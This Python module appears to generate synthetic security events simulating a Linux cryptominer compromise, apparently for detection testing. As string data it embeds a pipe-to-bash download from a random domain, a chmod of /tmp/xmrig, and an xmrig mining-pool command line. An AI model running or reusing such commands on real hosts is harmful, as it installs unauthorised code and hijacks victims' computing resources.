import random
from typing import Any, Dict, List

from ..builder import build_base_event
from .common import _append_and_maybe_stop, _rand_domain, _rand_hash, _shared_context


def linux_crypto_miner_chain(ctx: Dict[str, Any], attack_id: str, start_ts: int) -> List[Dict[str, Any]]:
    """Compromise of a Linux host to deploy a cryptocurrency miner."""
    shared = _shared_context(ctx)
    events: List[Dict[str, Any]] = []

    evt1 = build_base_event(
        start_ts,
        ctx,
        overrides={
            **shared,
            "category": "malcore",
            "severity": "3",
            "attack": {"id": attack_id, "stage": "initial_access", "sequence": 1},
            "dest_port": random.choice([8080, 7001, 9000]),
            "direction": "inbound",
            "action": "allowed",
        },
    )
    evt1["process"] = {
        "name": "curl",
        "command_line": f"curl -fsSL http://{_rand_domain()}/install.sh | bash",
    }
    evt1["network"]["direction"] = "inbound"
    if _append_and_maybe_stop(events, evt1):
        return events

    evt2 = build_base_event(
        start_ts + random.randint(10, 90),
        ctx,
        overrides={
            **shared,
            "category": "retrohunt",
            "severity": "3",
            "attack": {"id": attack_id, "stage": "execution", "sequence": 2},
            "action": "logged",
        },
    )
    evt2["process"] = {
        "name": "bash",
        "command_line": "bash install.sh && chmod +x /tmp/xmrig",
    }
    evt2["file"] = {
        "path": "/tmp/xmrig",
        "extension": "",
        "size": random.randint(500000, 2500000),
        "hash": {"sha256": _rand_hash()},
    }
    if _append_and_maybe_stop(events, evt2):
        return events

    evt3 = build_base_event(
        start_ts + random.randint(120, 300),
        ctx,
        overrides={
            **shared,
            "category": "sigflow_alert",
            "severity": "3",
            "attack": {"id": attack_id, "stage": "impact", "sequence": 3},
            "action": "blocked",
        },
    )
    evt3["process"] = {
        "name": "xmrig",
        "command_line": "./xmrig -o pool.supportxmr.com:3333 -u 48ff... -k --tls",
    }
    evt3["network"] = {
        **evt3["network"],
        "direction": "outbound",
        "protocol": "tcp",
    }
    evt3["destination"]["port"] = random.choice([3333, 4444, 5555])
    _append_and_maybe_stop(events, evt3)

    return events
